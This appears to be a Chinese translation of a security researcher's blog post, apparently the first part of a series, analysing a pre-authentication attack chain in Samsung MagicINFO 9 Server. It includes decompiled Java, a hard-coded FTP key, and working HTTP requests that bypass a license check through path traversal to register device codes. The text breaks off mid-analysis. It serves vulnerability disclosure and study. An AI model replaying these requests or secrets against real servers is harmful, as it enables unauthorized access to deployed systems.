#  Samstung 第 1 部分：MagicINFO 9 Server 远程代码执行  
SOURCE INCITE
                    SOURCE INCITE  securitainment   2026-02-06 08:50  
  
<table><thead><tr style="border-top-width: 1px;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: white;margin: 0px;padding: 0px;"><th style="font-weight: bold;border: 1px solid rgb(204, 204, 204);text-align: left;margin: 0px;padding: 6px 13px;"><section><span leaf="">原文链接</span></section></th><th style="font-weight: bold;border: 1px solid rgb(204, 204, 204);text-align: left;margin: 0px;padding: 6px 13px;"><section><span leaf="">作者</span></section></th></tr></thead><tbody><tr style="border-top-width: 1px;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: white;margin: 0px;padding: 0px;"><td style="border: 1px solid rgb(204, 204, 204);text-align: left;margin: 0px;padding: 6px 13px;"><section><span leaf="">https://srcincite.io/blog/2026/01/28/samstung-part-1-remote-code-execution-in-magicinfo-server.html</span></section></td><td style="border: 1px solid rgb(204, 204, 204);text-align: left;margin: 0px;padding: 6px 13px;"><section><span leaf="">SOURCE INCITE</span></section></td></tr></tbody></table>  
某个周末，我决定解包一下 Samsung 为其 MagicINFO 9 解决方案发布的一些 补丁。在这个过程中，我发现了多个漏洞，将它们串联起来可以实现预认证 (pre-authenticated) 的远程代码执行 (RCE)。不过，在一路追链的过程中我也踩了几个坑，所以想把这些失败经历分享出来，免得 让同行研究者不觉得孤单。别担心，这个系列将在 part 2 中收尾，我们会用一条预认证 RCE 的链条把故事讲完！  
  
很多人会问我：你是怎么挑选目标软件的？说实话，这一直是我的短板。我通常只是选择那些有高危漏洞历史、部署范围也较广的软件，因为我想把创作与探索的动力留给审计本身，同时也尽量避免陷入 analysis paralysis。幸运的是，现在很多时候目标是别人直接告诉我的，这样就省事多了！  
  
其中一个进入我视线的目标就是 Samsung MagicINFO 9 Server。2025 年 7 月，这个软件一口气发布了 18 个高危漏洞的通告 (例如 这里)，我很好奇这些 bug 到底是什么、又是如何修复的。于是我给自己抛出了一个问题 (更像一个挑战)：之前的审计中，有没有遗漏的预认证 RCE 漏洞？以及，这个产品的暴露面到底有多大？  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h4gtbB74nSgwyqsEwMpvEicsCNUS8vaiaIwBcfUiag4jIMZm7aFAD6cgfian3n4fmMuSTkAeQn5AU1Bjibd85fRwJmiasI4VsJCLRqMaPu3VCahFE/640?wx_fmt=png&from=appmsg "Shodan 搜索结果")  
  
在 Shodan 上随手一查，能看到全球大约有 ~ 6,683 台暴露的服务器，其中一些当然可能是蜜罐 (honeypots)，但这个数字已经足够体现其影响面。虽然这套软件本身看起来不太像会存储什么关键数据，但如果能在无用户交互的情况下拿到一个 foothold 来 pivot 进内网，那就很有吸引力了。挑战开始！  
## 版本  
  
我测试的版本，是当时最新的已打补丁版本 21.1080.0  
。测试的安装包文件为 MagicInfo 9 Server 21.1080.0 Setup.zip  
，发布日期是 2025 年 8 月 5 日，sha1 为 9744711fe76e7531f128835bf83c9ae001069115  
。需要注意的是，7 月那次 patch 修复了 18 个高危漏洞，其中很多是预认证漏洞或能实现认证绕过。  
## 漏洞  
  
今天我们会讨论以下漏洞：  
1. SRC-2025-0001 - Samsung MagicINFO 9 Server ResponseBootstrappingActivity Exposed Dangerous Method Remote Code Execution Vulnerability  
  
1. SRC-2025-0002 - Samsung MagicINFO 9 Server Hard-coded Credentials Local Privilege Escalation Vulnerability  
  
## 分析  
  
针对这条漏洞链，我们需要先分析一个旧漏洞 CVE-2025-54455。该漏洞影响版本 <= 21.1040.2  
。这部分我花了不少力气，因为这个组件使用了自定义的 SOAP 协议，而且会穿过多层 Java 逻辑。更多细节我会放到下一篇博客里；但归根结底，这是 com.samsung.magicinfo.framework.device.service.bootstrap.ResponseBootstrappingActivity  
类中的一段易受攻击代码：  
```
/* */ public Object process(HashMap params) throws ServiceException {/* 66 */ resultAppBO = null;/* */ try {/* */ // .../* 615 */ if (useFtpPassword7) { // 1/* 616 */ BaseUser user = new BaseUser();/* 617 */ String v7PasswordKey = current_time + deviceId + SecurityUtils.getFtpSecretKeyV7(); // 2/* 618 */ String encPass = SecurityUtils.getHashSha(v7PasswordKey, 16, 2); 3/* 619 */ user.setName(deviceId); // 4/* 620 */ user.setPassword(encPass); // 5/* 622 */ UserManager userMgr = (new databaseUserManagerFactory()).createUserManager();/* 623 */ userMgr.save(user); // 6/* 624 */ logger.error("[MagicInfo_Bootstrap][" + deviceId + "][FTP REGISTERING] DeviceTypeVersion is : " + deviceTypeVersion + " v7_password : " + encPass);/* 625 */ }
```  
  
在   
1  
处，我们可以把useFtpPassword7  
设为 true。在  
2  
处，代码会从数据库取出一个硬编码密码，并用当前timestamp  
、deviceId  
以及硬编码密钥拼出v7PasswordKey  
变量。在  
3  
处，这个字符串会做 sha256 hash，然后截取前 16 个字符作为密码。接着在  
4  
处，用deviceId  
作为 username 创建新用户；在  
5  
处把构造出的密码设置到BaseUser  
对象；最后在  
6  
处把 FTP 账号写入数据库。  
  
你能看出问题在哪吗？密码是可预测的，因为 timestamp 会在响应里返回！公平地说，我这里没把 response object 展示出来；但即便没有响应体，timestamp 也很可能是可推测的，攻击者完全可以利用服务器返回的 Date header。于是攻击者就能用可预测的值生成密码：current_time  
和 device_id  
已知，再加上硬编码的 FtpSecretKeyV7  
值。攻击者一旦登录成功，就能上传一个在服务器重启时触发的 backdoor。还有其他攻击方式，我会在 part 2 中记录，所以请务必继续关注！  
  
在分析补丁后的 ResponseBootstrappingActivity  
版本时，我们可以看到下面这段代码：  
```
/* 611 */ if (hashAlgo != null) { // 1/* 612 */ DeviceCode deviceCode = deviceDao.getDeviceCode(deviceId); // 2/* 613 */ if (deviceCode != null) {/* 614 */ if (RESTDeviceUtils.isSupportNewProtocol(hashAlgo, device_type, deviceTypeVersion)) {/* 615 */ String token = RESTDeviceUtils.makeToken(deviceId); // 3/* 616 */ BaseUser user = new BaseUser();/* 617 */ user.setName(deviceId); // 4/* 618 */ user.setPassword(token); // 4/* 619 */ UserManager userMgr = (new databaseUserManagerFactory()).createUserManager();/* 620 */ userMgr.save(user); // 5/* 621 */ logger.error("[MagicInfo_Bootstrap][" + deviceId + "][FTP REGISTERING] DeviceTypeVersion is : " + deviceTypeVersion);/* */ } else {/* 624 */ logger.error("[MagicInfo_Bootstrap][" + deviceId + "] Device firmware downgraded to old");/* 625 */ deviceDao.invalidateDeviceCode(deviceId);/* */ }/* */ }
```  
  
在   
1  
处，如果我们能把 hashAlgo  
设成任意非 null 的值，就能到达   
2  
。这里会在 DeviceDao  
上调用 getDeviceCode  
。DeviceDao  
本质上是一层 ORM，对应关系映射到相关的 xml 文件。我们关心的是 com/samsung/magicinfo/framework/device/deviceInfo/dao/DeviceDaoMapper.xml  
：  
```
 <select id="getDeviceCode" resultType="com.samsung.magicinfo.framework.device.deviceInfo.entity.DeviceCode"> SELECT * FROM MI_DMS_INFO_DEVICE_CODE WHERE DEVICE_ID = #{deviceId} </select>
```  
  
全新安装时，这个 MI_DMS_INFO_DEVICE_CODE  
表是空的，所以我们还得想办法把它填起来。继续往下看   
3  
，代码会调用 RESTDeviceUtils.makeToken  
。  
```
/* */ public static String makeToken(String deviceId) throws Exception {/* 463 */ String token = "";/* */ try {/* 465 */ token = DeviceSecurityManager.getAuthToken(deviceId);/* */ }/* 467 */ catch (Exception e) {/* 468 */ logger.error(e);/* */ }/* 470 */ return token;/* */ }
```  
  
这段代码只是调用了 DeviceSecurityManager.getAuthToken  
。如果我们再看 com.samsung.magicinfo.restapi.device.utils.DeviceSecurityManager  
，就会发现代码已经跳到一个 native lib DeviceSecurityManager.dll  
里去了。  
```
/* */ public class DeviceSecurityManager/* */ {/* 9 */ static Logger logger = LoggingManagerV2.getLogger(DeviceSecurityManager.class);/* 11 */ private static File libraryFile = null;/* */ static {/* */ try {/* 15 */ magicInfoHome = System.getenv("MAGICINFO_PREMIUM_HOME");/* 16 */ String libraryPath = "";/* 17 */ if (magicInfoHome != null && !magicInfoHome.equals(""))/* 18 */ libraryPath = magicInfoHome + File.separator + "bin" + File.separator + "DeviceSecurityManager.dll";/* 19 */ libraryFile = new File(libraryPath);/* 20 */ if (libraryFile.exists()) {/* 21 */ System.load(libraryFile.getPath());/* */ }/* 23 */ logger.info("[DeviceSecurityManager][getPassword] : Loaded Library " + libraryFile.getPath());/* 24 */ } catch (Exception e) {/* 25 */ logger.error("[DeviceSecurityManager][getPassword] : Error in Loading Library " + e.getMessage());/* */ }/* */ }/* */ public static String getAuthToken(String deviceId) {/* 30 */ String token = "";/* */ try {/* 32 */ token = getToken(deviceId);/* 33 */ } catch (Exception e) {/* 34 */ logger.error("[DeviceSecurityManager][getPassword] : " + e.getMessage());/* */ }/* 36 */ return token;/* */ }/* */ private static native String getToken(String paramString);/* */ }
```  
  
我们先把攻击者在"成功添加一个密码可预测的 FTP 账号"过程中需要解决的问题拆开来看：  
1. 我们能影响 hashAlgo  
吗？  
  
1. 我们能填充 MI_DMS_INFO_DEVICE_CODE  
表吗？  
  
1. 我们能搞清楚 DeviceSecurityManager.getAuthToken  
到底在做什么吗？  
  
### 问题 1 - 影响 hashAlgo  
```
/* 332 */ if (cpu_type != null && cpu_type.contains(";")) { // 1/* 333 */ String[] arrVals = cpu_type.split(";");/* */ try {/* 335 */ if (arrVals.length > 1) {/* 336 */ temp_cpu_type = arrVals[1];/* */ }/* 338 */ if (arrVals.length >= 3) {/* 339 */ hashAlgo = arrVals[2]; // 2/* */ } else {/* 342 */ hashAlgo = "";/* */ }
```  
  
如果我们能在   
1  
处影响 cpu_type  
，那就能在   
2  
处设置 hashAlgo  
。事实证明，cpu_type  
来自我们传入的 SOAP body：  
```
/* 204 */ String cpu_type = rs.getString(".MO.MONITOR_OPERATION.BOOTSTRAP.CPU_TYPE");
```  
  
别问我怎么知道的，这背后是很多小时的调试时间。  
### 问题 2 - 填充 MI_DMS_INFO_DEVICE_CODE 表  
  
这个问题的解法其实很简单：在同一个 DeviceDao  
里找到对应的 insert 语句：  
```
 <insert id="addDeviceCode"> INSERT INTO MI_DMS_INFO_DEVICE_CODE ( DEVICE_ID, UNIQUE_CODE, IS_VALID ) VALUES ( #{deviceId} , #{code}, <include refid="utils.true" /> ); </insert>
```  
  
搜索 addDeviceCode  
的调用点，我们在 com.samsung.magicinfo.restapi.device.service.V2DeviceSecurityServiceImpl  
里找到了一个很好的命中点：  
```
/* */ public boolean setUniqueCode(String code, String deviceId) throws Exception {/* 549 */ DeviceInfo deviceDao = DeviceInfoImpl.getInstance();/* 550 */ DeviceCode deviceCode = deviceDao.getDeviceCode(deviceId);/* 551 */ if (deviceCode != null && !deviceCode.checkIs_valid()) {/* 552 */ return false;/* */ }/* 554 */ if (deviceCode != null) {/* 555 */ EncryptionManager encMgr = EncryptionManagerImpl.getInstance();/* 556 */ String encCode = deviceCode.getUnique_code();/* 557 */ String actualCode = encMgr.getDecryptionPassword("", encCode);/* 558 */ if (!actualCode.equals(code) && deviceCode.checkIs_valid()) {/* 559 */ deviceDao.invalidateDeviceCode(deviceId);/* */ }/* 561 */ return false;/* */ }/* 565 */ EncryptionManager encMgr = EncryptionManagerImpl.getInstance();/* 566 */ String encryptPwd = encMgr.getEncryptionPassword("", code);/* 567 */ deviceDao.addDeviceCode(encryptPwd, deviceId); // 1/* 568 */ return true;/* */ }
```  
  
在   
1  
处，setUniqueCode  
会调用 addDeviceCode  
，而它又可以从 REST API 类 com.samsung.magicinfo.restapi.device.controller.V2DeviceSecurityController  
触达：  
```
/* */ @PostMapping({"/{deviceId}/init"})/* */ public ResponseEntity<String> registerUniqueCode(@PathVariable(value = "deviceId", required = true) @NotEmpty @NotNull String deviceId, @RequestBody Map<String, String> body) throws Exception {/* 262 */ this.logger.info("[REST_v2.0][Device][RegisterUniqueCode]: start for deviceID " + deviceId);/* 263 */ if (!RESTDeviceUtils.isValidDeviceId(deviceId)) {/* 264 */ this.logger.error("[REST_v2.0][Device][RegisterUniqueCode] end for deviceID " + deviceId + " Invalid deviceID");/* 265 */ return ResponseEntity.status(HttpStatus.BAD_REQUEST).body("Invalid deviceID");/* */ }/* 267 */ String UniqueCode = (String)body.get("data");/* 268 */ if (StringUtils.isBlank(UniqueCode) || UniqueCode.length() != 20) { // 2/* 269 */ this.logger.error("[REST_v2.0][Device][RegisterUniqueCode] end for deviceID " + deviceId + " Invalid input");/* 270 */ return ResponseEntity.status(HttpStatus.BAD_REQUEST).body("Invalid Input");/* */ }/* 272 */ boolean res = this.v2DeviceSecurityService.setUniqueCode(UniqueCode, deviceId); // 3/* 273 */ if (res) {/* 274 */ this.logger.info("[REST_v2.0][Device][RegisterUniqueCode] end for deviceID " + deviceId + " registered");/* 275 */ return ResponseEntity.ok().build();/* */ }/* 277 */ this.logger.info("[REST_v2.0][Device][RegisterUniqueCode] end for deviceID " + deviceId + " Already there");/* 278 */ return ResponseEntity.status(HttpStatus.FORBIDDEN).body("Already Present");/* */ }
```  
  
在   
2  
处会检查 device_code 的长度必须为 20，然后在   
3  
处调用 setUniqueCode  
。下面是对应的 API mapping：  
```
/* */ @Api(value = "Device Management System", description = "Operations pertaining to device in Device Management System", tags = {"Device API Group"})/* */ @RestController/* */ @Validated/* */ @ApiVersion({2.0D})/* */ @RequestMapping({"/restapi/v2.0/rms/devices"})/* */ public class V2DeviceSecurityController
```  
  
有意思的是，registerUniqueCode  
方法没有任何 authentication/authorization 的装饰；而对比之下，例如 getSecurityInfo  
方法是有的：  
```
/* */ @ApiOperation(value = "get security control info", notes = "...", authorizations = {@Authorization("api_key")}, tags = {"Device API Group"})/* */ @ApiImplicitParams({@ApiImplicitParam(name = "deviceIds", value = "Value of device IDs.", required = true, dataType = "V2CommonIds")})/* */ @PostMapping(value = {"/security-info"}, produces = {"application/json"})/* */ public ResponseEntity<ResponseBody<V2CommonBulkResultResource<DeviceSecurityConfResource, String>>> getSecurityInfo(@Valid @RequestBody V2CommonIds deviceIds) throws Exception {
```  
  
这意味着，到目前为止所有链路都是未认证的！不过，想利用这个方法还需要一点技巧。  
  
请求：  
```
POST /MagicInfo/restapi/v2.0/rms/devices/[device_id]/init HTTP/1.1Host: [target]:7002Content-Length: 33accept: application/jsonContent-Type: application/json{ "data":"AAAAAAAAAAAAAAAAAAAA"}
```  
  
响应：  
```
HTTP/1.1 405 Method Not Allowed...Content-Type: application/json;charset=UTF-8Date: Wed, 13 Aug 2025 03:45:53 GMTServer: MagicInfo Premium ServerContent-Length: 125{ "apiVersion":"2.0", "status":"Fail", "items":null, "errorCode":"405", "errorMessage": "Method Not Allowed", "isOutDoorSBox":false}
```  
  
等等，/MagicInfo/restapi/v2.0/rms/devices/[device_id]/init  
明明是一个 mapped URL，为什么会这样？原来代码通过 com.samsung.magicinfo.framework.common.LicenseCheckingAspect  
注入了一个 pointcut advice：  
```
/* */ @Around("within(com.samsung.magicinfo.restapi..*) && @within(org.springframework.web.bind.annotation.RestController)")/* */ public Object checkLicense(ProceedingJoinPoint joinPoint) throws Throwable {/* 44 */ if (this.freeUriList == null || this.freeUriList.isEmpty()) {/* 45 */ synchronized (this.freeUriList) {/* 46 */ initialize();/* */ }/* */ }/* 50 */ HttpServletRequest request = ((ServletRequestAttributes)RequestContextHolder.getRequestAttributes()).getRequest(); // 1/* 51 */ if (!checkFreeUri(request.getRequestURI())) { // 2/* 52 */ String signatureStr = joinPoint.getSignature().toString();/* 53 */ ResponseBody responseBody = new ResponseBody();/* 54 */ responseBody.setApiVersion("2.0");/* 55 */ if (!CommonUtils.checkAvailable(getMenu(signatureStr))) {/* 56 */ responseBody.setStatus("Fail");/* 57 */ responseBody.setErrorCode(ExceptionCode.HTTP405[0]);/* 58 */ responseBody.setErrorMessage(ExceptionCode.HTTP405[2]);/* 59 */ return new ResponseEntity(responseBody, HttpStatus.METHOD_NOT_ALLOWED);/* */ }/* */ }/* 63 */ return joinPoint.proceed();/* */ }
```  
  
在   
1  
处，代码拿到了当前请求对象；在   
2  
处，它用 getRequestURI  
的结果去调用 checkFreeUri  
。上过我 FSWA 课的人应该已经知道这要往哪走了 :->  
```
/* */ private void initialize() {/* 79 */ if (this.freeUriList == null) {/* 80 */ this.freeUriList = new ArrayList();/* */ }/* 83 */ if (this.freeUriList.isEmpty()) {/* 85 */ this.freeUriList.add("restapi/v2.0/ems/dashboard");/* 86 */ this.freeUriList.add("restapi/v2.0/rms/devices/device-types");/* 87 */ this.freeUriList.add("restapi/v2.0/sms/system/menus");/* 88 */ this.freeUriList.add("restapi/v2.0/ems/settings/my-account");/* 89 */ this.freeUriList.add("restapi/v2.0/ems/dashboard/notices");/* 90 */ this.freeUriList.add("restapi/v2.0/ems/dashboard/loggedin-user");/* 91 */ this.freeUriList.add("restapi/v2.0/ems/settings/logs/system-logs/filter");/* 92 */ this.freeUriList.add("restapi/v2.0/ems/settings/logs/alarm-mail-logs");/* 93 */ this.freeUriList.add("restapi/v2.0/ums");/* 94 */ this.freeUriList.add("restapi/v2.0/ems/settings");/* 95 */ this.freeUriList.add("restapi/v2.0/auth");/* 96 */ this.freeUriList.add("restapi/v2.0/edge");/* 97 */ this.freeUriList.add("restapi/v2.0/rms/devices/filter");/* 98 */ this.freeUriList.add("restapi/v2.0/sms/system/alerts");/* 99 */ this.freeUriList.add("restapi/v2.0/sms/system/configs");/* 100 */ this.freeUriList.add("restapi/v2.0/cms/contents/thumbnails");/* */ }/* */ }/* */ private boolean checkFreeUri(String requestUri) {/* 105 */ for (String uri : this.freeUriList) {/* 106 */ if (requestUri.contains(uri)) { // 3/* 107 */ this.logger.info("License-Free URI : " + requestUri);/* 108 */ return true;/* */ }/* */ }/* 111 */ return false;/* */ }
```  
  
在   
3  
处对 URI 做了一个 contains  
检查，只要请求 URI 包含这些字符串之一就放行。关键在于：getRequestURI  
不会解析路径穿越或 URL encoding，因此我们可以通过在 URI 里塞进 restapi/v2.0/auth  
来绕过检查。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/h4gtbB74nSiaItCLXicQjfONJT0tYMyOic9PrLQr3lfqvW3J8LJNe8kY61AtGjZSmuxg2Z2Lk0QLQuRMX8rSEOyI7Vwc7oEC2A2v0JyQibMEWP0/640?wx_fmt=png&from=appmsg "利用 free license 列表绕过受限 API 列表")  
  
请求：  
```
POST /MagicInfo/restapi/v2.0/auth/../rms/devices/[device_id]/init HTTP/1.1Host: [target]:7002Content-Length: 33accept: application/jsonContent-Type: application/json{ "data":"AAAAAAAAAAAAAAAAAAAA"}
```  
  
响应：  
```
HTTP/1.1 200 OKAccess-Control-Allow-Origin: *X-FRAME-OPTIONS: SAMEORIGINX-Content-Type-Options: nosniffContent-Security-Policy: default-src 'self' 'unsafe-inline' 'unsafe-eval' blob:; img-src 'self' data:;worker-src blob:;Strict-Transport-Security: max-age=31536000; includeSubDomains; preloadDate: Wed, 13 Aug 2025 03:51:43 GMTServer: MagicInfo Premium ServerContent-Length: 0
```  
  
这样就把 device_code 设置成了 AAAAAAAAAAAAAAAAAAAA  
。  
### 问题 3 - 搞清楚 DeviceSecurityManager.getAuthToken  
  
事实证明，DeviceSecurityManager.getAuthToken  
会回调到 Java 层，并按如下格式生成密码：[timestamp][device_id]\x01\x16\x1a\x02\x14\x13\x12\x11\x03[device_code]  
。其中 \x01\x16\x1a\x02\x14\x13\x12\x11\x03  
这串值，就是数据库里存的同一个硬编码密钥。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h4gtbB74nSghRQaxT53EjMbsrmfbibRbCkxOuRYjibo1qzjWWrUcy6TUYFqrduucECLb1yuXlIZI1Hv0Eh9S2uhdy9dqhMSBpfnuxfjBnJyFA/640?wx_fmt=png&from=appmsg "硬编码密钥仍是问题")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/h4gtbB74nSia0UP11KgTgHcLPappU2CwpyjWMKiacVCFjXlU6ibj6qUASVdpePoU5micEgukOrPOBlWqdsibnp2GzjxJfIxKqEeqmP74cyL8qmsU/640?wx_fmt=png&from=appmsg "FTP 密码生成")  
  
这个 device_code  
也同样是已知的，因为它就是我们在问题 2 里用到的那串值！  
### 设备已批准  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h4gtbB74nSjUJYhVzYQ1CduKy5Uyjp5fOtcGTfyy2BDhgMFibliaG0TIuQ0YOGWA888Bj2WciaQetRWSgyl1SpLwbq3YMWUCGou8WmeQtujkYw/640?wx_fmt=png&from=appmsg "Provisioning 设备 AB-CD-ED-GF-IJ-KL")  
  
毫无压力！这里我们拿到了一个小胜利：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h4gtbB74nSiaCc7NVCZv1pgglP3lZIqOS1XKUibQ8jq9OI0l6f7SUERdThcUKSibTQ0jv412bRQapdnS2iaLIhiaZthzkZ45znjQr7gE2bTE4Tmc/640?wx_fmt=png&from=appmsg "设备 AB-CD-ED-GF-IJ-KL 有效")  
### 登录  
  
呼！既然我们已经构造出 FTP 账号并拿到了有效密码，那就能直接登录了？对吧？对吧？！然而……在 org.apache.ftpserver.usermanager.impl.databaseUserManager  
里还有一个问题：  
```
/* */ public User authenticate(Authentication authentication) throws AuthenticationFailedException {/* 238 */ lazyInit();/* 240 */ if (authentication instanceof UsernamePasswordAuthentication) {/* 241 */ UsernamePasswordAuthentication upauth = (UsernamePasswordAuthentication)authentication;/* 243 */ String user = upauth.getUsername();/* 244 */ String password = upauth.getPassword();/* 246 */ if (user == null) {/* 247 */ throw new AuthenticationFailedException("Authentication failed");/* */ }/* 250 */ if (password == null) {/* 251 */ password = "";/* */ }/* 253 */ DownloadInfo dao = DownloadInfoImpl.getInstance();/* */ try {/* 255 */ String databasePassword = "";/* */ try {/* 258 */ if (isThisValidMISUser(user)) {/* 259 */ throw new AuthenticationFailedException("FTP disabled for MIS users");/* */ }/* 261 */ DeviceInfo deviceDao = DeviceInfoImpl.getInstance();/* 262 */ boolean isDeviceApproved = deviceDao.getDeviceApprovalStatusByDeviceId(user); // 1/* 263 */ if (!isDeviceApproved) {/* 264 */ throw new AuthenticationFailedException("Authentication failed");/* */ }
```  
  
在真正登录前，  
1  
处会调用 getDeviceApprovalStatusByDeviceId  
检查 device 是否处于 approved 状态。再看 DeviceDao  
对应的 mapper，可以看到：  
```
 <select id="getDeviceApprovalStatusByDeviceId" resultType="Boolean"> SELECT IS_APPROVED FROM MI_DMS_INFO_DEVICE WHERE DEVICE_ID = #{deviceId} </select>
```  
  
从宏观上看：攻击者通过"添加设备"创建 FTP 账号时，这个设备并不是 approved 状态，因此 FTP 账号就无法登录。该死，差一点。顺便一提：由于 com.samsung.magicinfo.mvc.security.SimpleAuthenticationProvider  
类的 validatePassword  
方法存在缺陷，攻击者甚至可以用 hashed password 直接登录 (pass-the-hash bug)。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/h4gtbB74nSiaOPVUCyX1iahdjLuo4rUNmt4SIJTA8oSvn7FGEibVZwiczaWfwaLF0ZAsUfeSXwGGOfUq56MkM0QFX8Gb1V0BtGBGdy1WL2UH8Po/640?wx_fmt=png&from=appmsg "Pass-the-hash!")  
  
咳咳，回到 FTP 登录这件事。Samsung 的开发者肯定在某处把 is_approved  
设为了 true。我找到的唯一一个未认证位置是在 com.samsung.magicinfo.framework.monitoring.service.ActivationServiceActivity  
类中：  
```
/* */ public Object process(HashMap params) throws ServiceException {/* 59 */ ResultSet rs = null;/* */ try {/* 61 */ rs = (ResultSet)params.get("resultset");/* */ //.../* 63 */ String deviceId = rs.getAttribute("DEVICE_ID"); // 1/* 79 */ if (device != null && eventPath != null && eventPath.equals(".MO.MONITORING_INFO.ACTIVATION"))/* */ {/* 81 */ if (rs.getString(".MO.MONITORING_INFO.ACTIVATION.ACTIVATION_CODE") != null &&/* 82 */ !rs.getString(".MO.MONITORING_INFO.ACTIVATION.ACTIVATION_CODE").equals("")) { // 2/* 83 */ String activation_code = rs.getString(".MO.MONITORING_INFO.ACTIVATION.ACTIVATION_CODE");/* 86 */ this.logger.error("[FET Activation Code] activation_code value " + activation_code);/* 89 */ ActivationInfo acDao = ActivationInfoImpl.getInstance();/* 93 */ if (acDao.isNewActivationCode(activation_code)) { // 3/* */ //.../* 102 */ return driver.createAppBOForResponse(rmql);/* */ }/* 106 */ this.logger.error("[Activation Code] this is saved AC " + activation_code);/* 108 */ ActivationEntity aEntity = acDao.getActivationInfo(activation_code);/* 109 */ int comp = aEntity.getExpired_date().compareTo(new Timestamp(System.currentTimeMillis()));/* 110 */ if (comp < 0) { // 4/* */ //.../* 121 */ return driver.createAppBOForResponse(rmql);/* */ }/* */ //.../* 199 */ Map param = new HashMap();/* 200 */ param.put("device_name", autoDevNamePrefix);/* 201 */ param.put("device_id", deviceId);/* 202 */ param.put("device_type", device.getDevice_type());/* 203 */ param.put("group_id", basicDevGrpId);/* 204 */ param.put("current_group_id", Integer.valueOf(999999));/* 205 */ param.put("device_model_name", null);/* 206 */ param.put("location", "");/* 207 */ param.put("is_approved", Boolean.valueOf(true)); // 5/* 208 */ param.put("calDate", "");/* 209 */ param.put("orgGroupId", devOrgGrpId);/* 210 */ int seq = deviceInfo.setApprovalWithSeq(param);/* 212 */ String autoDevName = autoDevNamePrefix + "_" + String.format("%04d", new Object[] { Integer.valueOf(seq) }) + "_" + deviceId;/* 213 */ this.logger.error("[Activation Code] autoDevName " + autoDevName);/* *//* 215 */ DeviceUtils.approveDevice("", basicDevGrpId, autoDevName, "", deviceId, null, "sessionId", "admin", "", "", "activationService"); // 6
```  
  
在   
1  
处，DEVICE_ID  
由传入请求控制。在  
2  
处，必须设置.MO.MONITORING_INFO.ACTIVATION.ACTIVATION_CODE  
对应的mo_path  
。这一点后面很关键。在  
3  
处，会对攻击者可控的activation_code  
调用isNewActivationCode  
。它的定义在ActivationDao  
的 mapper 中，路径是com/samsung/magicinfo/framework/setup/dao/ActivationDaoMapper.xml  
：  
```
 <select id="isNewActivationCode" resultType="long"> SELECT COUNT(ACTIVATION_CODE) FROM MI_SAAS_INFO_ACTIVATION_CODE WHERE ACTIVATION_CODE = #{activationCode} </select>
```  
  
哎呀！看起来数据库里也没有这个。如果这个判断返回 true，就会直接 early return，这不太理想。我们先把这个问题放一放，继续往下：我们可以到达   
4  
，确保 activation_code  
没有过期。如果 activation code 过期，同样会 early return。最终，在通过所有检查后，我们可以到达   
5  
：把设备设为 approved，并在   
6  
处更新数据库。看起来我们需要先插入一个 activation code。查看 ActivationDao  
mapper，可以看到：  
```
 <insert id="addActivationInfo"> INSERT INTO MI_SAAS_INFO_ACTIVATION_CODE (ACTIVATION_CODE, ORGAN_ID, EXPIRED_DATE, CREATE_DATE, LAST_MODIFIED_DATE) VALUES (#{entity.activation_code}, #{entity.organ_id}, #{entity.expired_date}, <include refid="utils.currentTimestamp" /> , <include refid="utils.currentTimestamp" /> ) </insert>
```  
  
本质上，我们要找的是 addActivationInfo  
的调用点。整个代码库里对这个方法有 3 处调用。在 com.samsung.magicinfo.openapi.custom.service.CommonUserService  
类里，我们可以看到其中 2 处来自 acceptContractforNoc  
方法。但这个方法只有在调用 addUserContractMap  
把 MI_USER_MAP_USER_CONTRACT  
表填充后才会生效；而 (不) 幸的是，这个方法在代码里从未被调用过，于是这里就走进了死胡同。  
  
最后的救命稻草是 com.samsung.magicinfo.openapi.custom.service.CommonSettingService  
类：  
```
/* */ public String addActivationInfo(Long organ_id, String expired_date_str) throws OpenApiServiceException {/* 461 */ if (!this.canReadActivationCode) // 1/* */ {/* 463 */ throw new OpenApiServiceException(OpenApiExceptionCode.E401[0], OpenApiExceptionCode.E401[1]);/* */ }/* 468 */ boolean canReadAuth = this.user.checkAuthority("Server Setup Manage"); // 2/* 470 */ if (!canReadAuth) {/* 471 */ throw new OpenApiServiceException(OpenApiExceptionCode.U110[0], OpenApiExceptionCode.U110[1]);/* */ }/* 475 */ ActivationInfo acInfo = ActivationInfoImpl.getInstance();/* 477 */ String newActivationCode = null;/* 478 */ int ret = 0;/* */ try {/* 480 */ SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");/* 481 */ Date date = sdf.parse(expired_date_str + " 23:59:59");/* 482 */ Timestamp expired_date = new Timestamp(date.getTime());/* 484 */ ActivationEntity acEntity = new ActivationEntity();/* 486 */ acEntity.setOrgan_id(organ_id);/* 487 */ acEntity.setExpired_date(expired_date);/* 489 */ newActivationCode = acInfo.genNewActivationCode();/* 490 */ acEntity.setActivation_code(newActivationCode);/* 492 */ ret = acInfo.addActivationInfo(acEntity);/* */ }/* 494 */ catch (Exception e) {/* 495 */ logger.error("", e);/* */ }/* 498 */ if (ret > 0) {/* 499 */ return newActivationCode; // 3/* */ }/* 501 */ return "FAIL";/* */ }
```  
  
到这里为止，所有东西都是预认证的，我正兴奋地准备继续把兔子洞挖到底。但现在我们又遇到了 3 个新问题：  
1. 在 C:/MagicInfo Premium/server/WEB-INF/openapi_service_config.xml  
文件里，我们能看到该方法的定义，其中 noAuthCheck  
属性为 false。这意味着它需要认证。  
  
```
 <method enable="true" name="addActivationInfo" noAuthCheck="false" requireDeviceType="false" requireUserInfo="false" show="true"> <documentation>addActivationInfo</documentation> <form>GET</form> <returnType> <type>class java.lang.String</type> <documentation>Generated activation code</documentation> </returnType> <parameters> <param paramName="organ_id" type="class java.lang.Long" xmlTransferable="false"> <documentation>user organization id</documentation> </param> <param paramName="expired_date_str" type="class java.lang.String" xmlTransferable="false"> <documentation>YYYY-MM-DD</documentation> </param> </parameters> </method>
```  
1. 第二个障碍是：在   
1  
处检查了 canReadActivationCode  
：  
  
```
